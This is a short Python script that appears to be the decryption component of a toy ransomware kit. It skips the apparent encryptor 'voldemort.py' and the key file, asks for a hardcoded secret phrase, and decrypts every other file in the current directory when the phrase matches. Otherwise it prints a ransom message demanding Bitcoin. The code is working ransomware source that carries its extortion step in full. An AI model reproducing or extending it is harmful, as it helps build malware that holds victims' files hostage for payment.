#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secret_key = key.read()

secret_phrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files:\n ")

if user_phrase == secret_phrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print(
            "Congrats, your files have been decrypted. "
            "Enjoy your coffee ️❤ ☕ ❤"
        )
else:
    print(
        "Sorry not sorry, but you entered da wong secret phrase. "
        "Send me more Bitcoin! 🤑"
    )
